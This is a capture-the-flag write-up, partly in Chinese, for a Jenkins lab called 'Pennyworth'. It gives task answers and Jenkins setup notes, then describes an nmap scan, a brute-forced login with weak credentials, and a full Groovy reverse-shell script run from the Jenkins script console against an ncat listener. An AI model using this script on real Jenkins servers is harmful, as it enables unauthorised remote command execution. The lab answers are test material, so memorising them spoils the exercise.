<center>Pennyworth</center>





[toc]







## Pennyworth

> Pennyworth







### 1. task

1. What does the acronym CVE stand for?

```shell
Common Vulnerabilities and Exposures
```

2. What do the three letters in CIA, referring to the CIA triad in cybersecurity, stand for?

```shell
Confidentiality, Integrity, Availability
```

3. What is the version of the service running on port 8080?

````shell
Jetty 9.4.39.v20210325
````

4. What version of Jenkins is running on the target?

```shell
2.289.1
```

5. What type of script is accepted as input on the Jenkins Script Console?

```shell
Groovy
```

6. What would the "String cmd" variable from the Groovy Script snippet be equal to if the Target VM was running Windows?

```shell
cmd.exe
```

7. What is a different command than "ip a" we could use to display our network interfaces' information on Linux?

```shell
ifconfig
```

8. What switch should we use with netcat for it to use UDP transport mode?

```shell
-u
```

9. What is the term used to describe making a target host initiate a connection back to the attacker host?

```shell
reverse shell
```





### 2. Jenkins

> Jenkins 是一个开源的持续集成/持续部署（CI/CD）工具： [官网](https://www.jenkins.io/zh/)

```shell
自动化构建
自动化测试
自动化部署
丰富的插件生态
支持分布式构建
```

````shell
1. 服务端搭建


#### Ubuntu/Debian 安装
```bash
# 添加 Jenkins 源
curl -fsSL https://pkg.jenkins.io/debian-stable/jenkins.io.key | sudo tee \
  /usr/share/keyrings/jenkins-keyring.asc > /dev/null

echo deb [signed-by=/usr/share/keyrings/jenkins-keyring.asc] \
  https://pkg.jenkins.io/debian-stable binary/ | sudo tee \
  /etc/apt/sources.list.d/jenkins.list > /dev/null

# 安装 Jenkins
sudo apt update
sudo apt install jenkins

# 启动服务
sudo systemctl start jenkins
sudo systemctl enable jenkins
```


#### Docker 安装（推荐）
```bash
# 创建 Jenkins 数据目录
mkdir -p /data/jenkins_home
chown -R 1000:1000 /data/jenkins_home

# 运行 Jenkins 容器
docker run -d \
  --name jenkins \
  -p 8080:8080 \
  -p 50000:50000 \
  -v /data/jenkins_home:/var/jenkins_home \
  jenkins/jenkins:lts
```


### 3. 初始配置

#### 获取初始密码
```bash
# Docker 安装
docker logs jenkins

# 系统安装
sudo cat /var/lib/jenkins/secrets/initialAdminPassword
```


#### Jenkins 配置文件
```xml:/var/lib/jenkins/config.xml
<?xml version='1.1' encoding='UTF-8'?>
<hudson>
  <disabledAdministrativeMonitors/>
  <version>2.346.1</version>
  <numExecutors>2</numExecutors>
  <mode>NORMAL</mode>
  <useSecurity>true</useSecurity>
  <authorizationStrategy class="hudson.security.FullControlOnceLoggedInAuthorizationStrategy">
    <denyAnonymousReadAccess>true</denyAnonymousReadAccess>
  </authorizationStrategy>
  ...
</hudson>
```


### 4. 安装必要插件

```groovy
// 推荐安装的插件
- Git plugin
- Pipeline
- Docker Pipeline
- Blue Ocean
- Credentials Plugin
- SSH Build Agents
- Workspace Cleanup
```

````









### 3. flag

> 获取flag

```shell
nmap -sC -sV IP
```

![image-20241202155618773](./assets/image-20241202155618773.png)

> 访问8080端口。
>
> 登陆接口没做任何防御。 进行爆破

```shell
账号密码：root/password
```

> **`访问 :8080/script，利用Groovy命令获取反弹shell`**

> **在Jenkins脚本控制台中，可以编写和运行Groovy脚本，尝试在Jenkins控制台插入反弹shell脚本。**

```shell
# 在攻击机执行监听
ncat -nvlp 1234

访问target_ip:8080/script，在Jenkins控制台插入Groovy脚本，点击run运行
```

```groovy
//脚本
String host="host_ip";
int port=监听端口;
String cmd="/bin/bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();

```

> 获取到`shell`

![image-20241202160005838](./assets/image-20241202160005838.png)